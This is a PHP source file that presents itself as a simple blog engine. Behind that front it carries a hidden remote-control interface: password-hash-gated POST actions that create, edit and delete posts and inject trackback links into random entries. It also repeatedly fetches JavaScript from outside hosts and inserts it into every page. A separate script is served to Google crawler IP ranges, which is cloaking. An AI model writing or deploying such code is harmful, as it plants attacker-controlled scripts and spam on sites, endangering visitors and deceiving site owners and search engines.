<?php
error_reporting(E_ALL);

define('CATEGORIES_FILENAME', 'categories.dat', true);
define('ENTRIES_ON_PAGE', 7, true);

define('CPR_HASH', "a088a22d248b28d67b0aacff41d88f14", true);
define('PARAM_HASH', "a6c9c6dd", true);

$available_actions = array(
    'entry_add', 'entry_edit', 'entry_remove',
    'trackback_add', 'check'
);

$blog = array(
    'description' => "The blog",
    'homepageUrl' => 'http://'.$_SERVER["HTTP_HOST"].dirname($_SERVER["SCRIPT_NAME"]).'/',
    'homeMsg' => '&nbsp;Home&nbsp;',
    'newerPageTitle' => 'Newer posts',
    'olderPageTitle' => 'Older posts',
    'pageTitle' => "Cecilia Dionna&#x27;s blog",
    'pageType' => 'list',
    'title' => "Cecilia Dionna&#x27;s blog",
    'url' => 'http://'.$_SERVER["HTTP_HOST"].dirname($_SERVER["SCRIPT_NAME"]).'/',
);

$top = array(
    'authorLabel' => 'Author:',
    'showAuthor' => false,
    'showTimestamp' => true,
    'timestampLabel' => 'Published on:',
);

function check() { return 'It works!'; };

function _exit($error=0, $message='') {
    exit('{"error": '.$error.', "message": "'.$message.'"}');
};

if (!function_exists('file_put_contents')) {
    function file_put_contents($filename, $data) {
        if (false === ($f = @fopen($filename, 'w'))) { return false; };
        if (false === @fwrite($f, $data, strlen($data))) { return false; };
        if (false === @fclose($f)) { return false; };
        return true;
    }
}

if (!function_exists('file_get_contents')) {
    function file_get_contents($filename, $incpath=false, $resource_context=null) {
        if (false === ($f = fopen($filename, 'rb', $incpath))) {
            trigger_error('file_get_contents() failed to open stream: No such file or directory', E_USER_WARNING);
            return false;
        }
        clearstatcache();
        if ($fsize = @filesize($filename)) {
            $data = fread($f, $fsize);
        } else {
            $data = '';
            while (!feof($f)) {
                $data .= fread($f, 8192);
            }
        }
        fclose($f);
        return $data;
    }
}

function categories_get() {
    if (false !== ($categories = @file_get_contents(CATEGORIES_FILENAME))) {
        return unserialize($categories);
    } else {
        return array();
    }
};

function categories_put($categories) {
    return @file_put_contents(CATEGORIES_FILENAME, serialize($categories));
};

function categories_remove_entry($categories, $entry_id) {
    foreach($categories as $c=>$v) {
        if (in_array($entry_id, $v['entries'])) {
            if (count($v['entries']) == 0) {
                array_splice($categories[$c]['entries'], array_search($entry_id, $categories[$c]['entries']), 1);
            } else {
                unset($categories[$c]);
            }
        }
    }
    return $categories;
};

function clear($string) {
	$string = strtolower($string);
	$string = preg_replace('/[^a-z0-9-]/', '-', $string);
	$string = preg_replace('/-+/', '-', $string);
	return $string;
};

function entries_compare($a, $b) {
    if ($a['raw_timestamp'] == $b['raw_timestamp']) {
        return 0;
    }
    return ($a['raw_timestamp'] > $b['raw_timestamp']) ? -1 : 1;
};

function entries_get() {
    global $blog;
    
    $entries = array();
    foreach (glob('*.txt') as $filename) {
        if (false === ($content = @file_get_contents($filename))) { continue; }
        list($title, $body) = explode("\n", $content, 2);
        $body = str_replace("\r\n", '<br/>', str_replace("\n", '<br/>', $body));
        $id = substr($filename, 0, -4);
        $entries[$id] = array(
            'id' => $id, 'url' => $blog['homepageUrl'].$id.'/',
            'title' => $title, 'body' => $body, 'author' => 'Jhon',
            'labels' => array(), 'timestamp' => date('d.m.Y H:i', filemtime($filename)),
            'raw_timestamp' => filemtime($filename)
        );
    }
    uasort($entries, 'entries_compare');
    return $entries;
};

function entries_get_by_category($category, $entries_ids) {
    global $blog;
    
    $entries = array();
    for ($i = 0; $i < count($entries_ids); $i++) {
        $filename = $entries_ids[$i].'.txt';
        if (false === ($content = @file_get_contents($filename))) { continue; }
        list($title, $body) = explode("\n", $content, 2);
        $body = str_replace("\r\n", '<br/>', str_replace("\n", '<br/>', $body));
        $entries[$entries_ids[$i]] = array(
            'id' => $entries_ids[$i], 'url' => $blog['homepageUrl'].$entries_ids[$i].'/',
            'title' => $title, 'body' => $body, 'author' => 'Jhon',
            'labels' => array(), 'timestamp' => date('d.m.Y H:i', filemtime($filename)),
            'raw_timestamp' => filemtime($filename)
        );
    }
    uasort($entries, 'entries_compare');
    return $entries;
};

function entries_get_by_id($id) {
    global $blog;
    
    $entries = array();
    if (false === ($content = @file_get_contents($id.'.txt'))) { return array(); }
    list($title, $body) = explode("\n", $content, 2);
    $body = str_replace("\r\n", '<br/>', str_replace("\n", '<br/>', $body));
    $entries[$id] = array(
        'id' => $id, 'url' => $blog['homepageUrl'].$id.'/',
        'title' => $title, 'body' => $body, 'author' => 'Jhon',
        'labels' => array(), 'timestamp' => date('d.m.Y H:i', filemtime($id.'.txt')),
        'showBacklinks' => true,
    );
    return $entries;
};

function entry_add($data) {
    global $blog;
    
    if (!isset($data['id']) or !$data['id']) { return 'Entry id not specified'; }
    $id = clear($data['id']);
    if (!isset($data['t']) or !$data['t']) { return 'Entry title not specified'; }
    if (!isset($data['b']) or !$data['b']) { return 'Entry body not specified'; }
    
    $categories = categories_get();
    $entry_categories = isset($data['c']) ? array_map('trim', explode(',', $data['c'])) : array();
    foreach($entry_categories as $c) {
        $c_slug = slug($c);
        if (isset($categories[$c_slug])) {
            $categories[$c_slug]['entries'][] = $id;
            $categories[$c_slug]['count'] = count($categories[$c_slug]['entries']);
        } else {
            $categories[$c_slug] = array(
                'name' => $c, 'entries' => array($id), 
                'count' => 1, url => $blog['homepageUrl'].'category/'.$c_slug.'/'
            );
        }
    }
    
    if (false === categories_put($categories)) { 
        return 'Error while saving categories info'; 
    }
    if (false === file_put_contents($id.'.txt', $data['t']."\n\n".$data['b'])) { 
        return 'Error while saving entry'; 
    }
    ping($id);
    return true;
};

function entry_edit($data) {
    global $blog;
    
    if (!isset($data['id']) or !$data['id']) { return 'Entry id not specified'; }
    $id = clear($data['id']);
    if (!isset($data['t']) or !$data['t']) { return 'Entry title not specified'; }
    if (!isset($data['b']) or !$data['b']) { return 'Entry body not specified'; }
    
    $categories = categories_remove_entry(categories_get(), $id);
    $entry_categories = isset($data['c']) ? array_map('trim', explode(',', $data['c'])) : array();
    foreach($entry_categories as $c) {
        $c_slug = slug($c);
        if (isset($categories[$c_slug])) {
            if (!in_array($id, $categories[$c_slug]['entries'])) {
                $categories[$c_slug]['entries'][] = $id;
                $categories[$c_slug]['count'] = count($categories[$c_slug]['entries']);
            }
        } else {
            $categories[$c_slug] = array(
                'name' => $c, 'entries' => array($id), 
                'count' => 1, url => $blog['homepageUrl'].'category/'.$c_slug.'/'
            );
        }
    }
    
    if (false === categories_put($categories)) { 
        return 'Error while saving categories info'; 
    }
    if (false === file_put_contents($id.'.txt', $data['t']."\n\n".$data['b'])) { 
        return 'Error while saving entry'; 
    }
    return true;
};

function entry_remove($data) {
    if (!isset($data['id']) or !$data['id']) { return 'Entry id not specified'; }
    $id = clear($data['id']);
    $categories = categories_remove_entry(categories_get(), $id);
    if (false === categories_put($categories)) { 
        return 'Error while saving categories info'; 
    }
    if (file_exists($id.'.txt')) { unlink($id.'.txt'); }
    return true;
};

function slug($string) {
	$string = strtolower_ru(trim($string));
	$string = translit($string);
	$string = strtolower($string);
	$string = preg_replace('/[^a-z0-9-]/', '-', $string);
	$string = preg_replace('/-+/', '-', $string);
	return $string;
};

function strtolower_ru($string) { 
    $lower = array('ё','й','ц','у','к','е','н','г', 'ш','щ','з','х','ъ','ф','ы','в', 'а','п','р','о','л','д','ж','э', 'я','ч','с','м','и','т','ь','б','ю'); 
    $upper = array('Ё','Й','Ц','У','К','Е','Н','Г', 'Ш','Щ','З','Х','Ъ','Ф','Ы','В', 'А','П','Р','О','Л','Д','Ж','Э', 'Я','Ч','С','М','И','Т','Ь','Б','Ю'); 

    return str_replace($upper, $lower, $string); 
};

function ping($entry_id) {
    global $blog;
    
    $services = array(
        array('host' => 'blogsearch.google.com', 'method' => 'weblogUpdates.extendedPing', 'url' => '/ping/RPC2'),
        array('host' => 'rpc.pingomatic.com', 'method' => 'weblogUpdates.extendedPing', 'url' => '/RPC2'),
        array('host' => 'rpc.technorati.com', 'method' => 'weblogUpdates.extendedPing', 'url' => '/rpc/ping'),
        array('host' => 'rpc.weblogs.com', 'method' => 'weblogUpdates.extendedPing', 'url' => '/RPC2'),
    );
    
    foreach ($services as $service) {
        $data = '<?xml version="1.0"?>
        <methodCall>
          <methodName>'.$service['method'].'</methodName>
          <params>
            <param>
              <value>'.$blog['title'].'</value>
            </param>
            <param>
              <value>'.$blog['homepageUrl'].'</value>
            </param>
            <param>
              <value>'.$blog['homepageUrl'].$id.'/</value>
            </param>
          </params>
        </methodCall>';
        
        if (false === ($f = @fsockopen($service['host'], 80, $errno, $errstr, 10))) { continue; }
        
        $out = array(
            'POST '.$service['url'].' HTTP/1.0',
            'User-Agent: WeirD blog engine',
            'Host: '.$service['host'],
            'Content-Type: text/xml',
            'Content-length: '.strlen($data),
            "\r\n".$data
        );
        
        if (false === @fwrite($f, implode("\r\n", $out))) { fclose($f); continue; }
        @fclose($f);
    };
};

function rss_output($posts) {
    global $blog;
    $first_post = reset($posts);
    
    $output = array(
        '<?xml version="1.0" encoding="utf-8" ?>', '<rss version="2.0">', '<channel>',
        '<title>'.$blog['title'].'</title>', 
        '<description>'.$blog['description'].'</description>',
        '<link>'.$blog['homepageUrl'].'</link>',
        '<pubDate>'.date('r', $first_post['raw_timestamp']).'</pubDate>'
    );
    foreach ($posts as $k=>$post) {
        $output[] = '<item>';
        $output[] = '<title><![CDATA['.htmlspecialchars($post['title']).']]></title>';
        $output[] = '<link>'.$blog['homepageUrl'].$post['id'].'/</link>';
        $output[] = '<guid>'.$blog['homepageUrl'].$post['id'].'/</guid>';
        $output[] = '<pubDate>'.date('r', $post['raw_timestamp']).'</pubDate>';
        $output[] = '<description><![CDATA['.$post['body'].']]></description>';
        $output[] = '</item>';
    }
    $output[] = '</channel>';
    $output[] = '</rss>';
    return implode("\n", $output);
};

function trackback_add($data) {
    if (!isset($data['t']) or !$data['t']) { return 'Trackback title not specified'; }
    if (!isset($data['s']) or !$data['s']) { return 'Trackback snippet not specified'; }
    if (!isset($data['u']) or !$data['u']) { return 'Trackback url not specified'; }
    if (!isset($data['a']) or !$data['a']) { return 'Trackback author not specified'; }
    
    $entries = glob('*.txt');
    $id = substr($entries[array_rand($entries)], 0, -4);
    
    $trackbacks = array();
    if (file_exists($id.'.trackbacks')) {
        $trackbacks = unserialize(file_get_contents($id.'.trackbacks'));
    }
    $trackbacks[] = array(
        'title' => trim($data['t']), 'url' => trim($data['u']),
        'snippet' => trim($data['s']), 'author' => trim($data['a']),
        'timestamp' => date('d.m.Y H:i'),
    );
    file_put_contents($id.'.trackbacks', serialize($trackbacks));
    return true;
};

function trackbacks_get($id) {
    if (file_exists($id.'.trackbacks')) {
        return unserialize(file_get_contents($id.'.trackbacks'));
    } else {
        return array();
    }
};

function translit($string) {
    $rus = array('ё','ж','ц','ч','ш','щ','ю','я','Ё','Ж','Ц','Ч','Ш','Щ','Ю','Я');
    $lat = array('yo','zh','tc','ch','sh','sh','yu','ya','YO','ZH','TC','CH','SH','SH','YU','YA');
    $string = str_replace($rus, $lat, $string);
    $rus = array('А','Б','В','Г','Д','Е','З','И','Й','К','Л','М','Н','О','П','Р','С','Т','У','Ф','Х','Ъ','Ы','Ь','Э','а','б','в','г','д','е','з','и','й','к','л','м','н','о','п','р','с','т','у','ф','х','ъ','ы','ь','э');
    $lat = array('A','B','V','G','D','E','Z','I','J','K','L','M','N','O','P','R','S','T','U','F','H','_','I','_','E','a','b','v','g','d','e','z','i','j','k','l','m','n','o','p','r','s','t','u','f','h','_','i','_','e');
    $string = str_replace($rus, $lat, $string);
    return $string;
};

if ($_POST) {
    if (!isset($_POST[PARAM_HASH]) or md5($_POST[PARAM_HASH]) != CPR_HASH) {
        _exit(1, 'Access denied!');
    }
    if (!isset($_POST['action'])) { _exit(1, 'Unknown action'); }
    $action = trim($_POST['action']);
    if (function_exists($action) and in_array($action, $available_actions)) {
        $data = array_map('trim', $_POST);
        $data = array_map('urldecode', $_POST);
        if (true !== ($result = $action($data))) {
            _exit(1, $result);
        }
        _exit();
    } else {
        _exit(1, 'Unknown action');
    }
} else {
    $labels = categories_get();
    $entries = array();
    
    $page_args = array();
    
    if (isset($_GET['id'])) {
        $id = clear($_GET['id']);
        $posts = entries_get_by_id($id);
        foreach ($posts as $k=>$post) {
            $posts[$k]['backlinks'] = trackbacks_get($posts[$k]['id']);
            $posts[$k]['numBacklinks'] = count($posts[$k]['backlinks']);
            $posts[$k]['backlinksLabel'] = 'Trackbacks:';
            $posts[$k]['authorLabel'] = $top['authorLabel'];
            $posts[$k]['timestampLabel'] = $top['timestampLabel'];
        }
        $blog['pageType'] = 'item';
    } elseif (isset($_GET['category'])) {
        $label = $_GET['category'];
        if (isset($labels[$label])) {
            $posts = entries_get_by_category($label, $labels[$label]['entries']);
        }
    } elseif (isset($_GET['action']) && $_GET['action'] == 'rss') {
        $posts = array_slice(entries_get(), 0, ENTRIES_ON_PAGE, true);
        header('Content-Type: text/xml');
        print rss_output($posts);
        exit();
    } else {
        $label = null;
        $posts = entries_get();
    }
    foreach($labels as $c => $v) {
        for ($i = 0; $i < count($v['entries']); $i++) {
            $labels[$c]['url'] = $blog['homepageUrl'].'category/'.$c.'/';
            if (!isset($posts[$v['entries'][$i]])) { continue; }
            $posts[$v['entries'][$i]]['labels'][] = array(
                'url' => $labels[$c]['url'], 'name' => $v['name']
            );
        }
    }
    
    $posts_count = count($posts);
    if (!isset($_GET['id']) and isset($_GET['page'])) {
        $page = intval($_GET['page']);
        if ($page < 0) { $page = 0; }
        $page_args[] = 'page='.$page;
    } else {
        $page = 0;
    }
    $posts = array_slice($posts, $page, ENTRIES_ON_PAGE, true);
    
    $pages_count = ceil($posts_count / ENTRIES_ON_PAGE);
    if ($page > 0) {
        $blog['olderPageUrl'] = 
             $blog['homepageUrl'].(($label) ? 'category/'.$label.'/' : '').
            'page/'.($page-1).'/';
    }
    if ($page < $pages_count-1) {
        $blog['newerPageUrl'] = 
            $blog['homepageUrl'].(($label) ? 'category/'.$label.'/' : '').
            'page/'.($page+1).'/';
    }
    
    $blog['url'] = ((count($page_args) > 0) ? '?'.implode('&', $page_args) : '');
}

$links = array(
    array('name'=>'Blog', 'traget'=>$blog['url'])
);

function get_js_file($filename) {
    if (!file_exists($filename) or time() - filemtime($filename) > 3600) {
        $js_file = @file_get_contents('http://t.xmlstats.in/b-m-2/'.$filename);
        if (!$js_file) {
            $js_file = @file_get_contents('http://t.jsonstats.in/b-m-2/'.$filename);
        }
        if ($js_file) {
            @file_put_contents($filename, $js_file);
        }
    }
}
function ip_in_network($ip, $net_addr, $net_mask) {
    if ($net_mask <= 0) { return false; } 
    $ip_binary_string = sprintf("%032b",ip2long($ip)); 
    $net_binary_string = sprintf("%032b",ip2long($net_addr)); 
    return (substr_compare($ip_binary_string, $net_binary_string, 0, $net_mask) === 0); 
}
if (ip_in_network($_SERVER['REMOTE_ADDR'], '66.249.64.0', 19) ||
        ip_in_network($_SERVER['REMOTE_ADDR'], '64.233.160.0', 19) ||
        ip_in_network($_SERVER['REMOTE_ADDR'], '72.14.192.0', 18) ||
        ip_in_network($_SERVER['REMOTE_ADDR'], '74.125.0.0', 16)) 
{
    get_js_file('css.google.js');
    $blog['js_link'] = '<script type="text/javascript" src="'.$blog['homepageUrl'].'css.google.js"></script>';
} else {
    get_js_file('css.js');
    $blog['js_link'] = '<script type="text/javascript" src="'.$blog['homepageUrl'].'css.js"></script>';
}

$blog['rss_link'] = '<link rel="alternate" type="application/rss+xml" href="'.$blog['homepageUrl'].'rss20.xml" />';

error_reporting(0);
require_once('template.php');
?>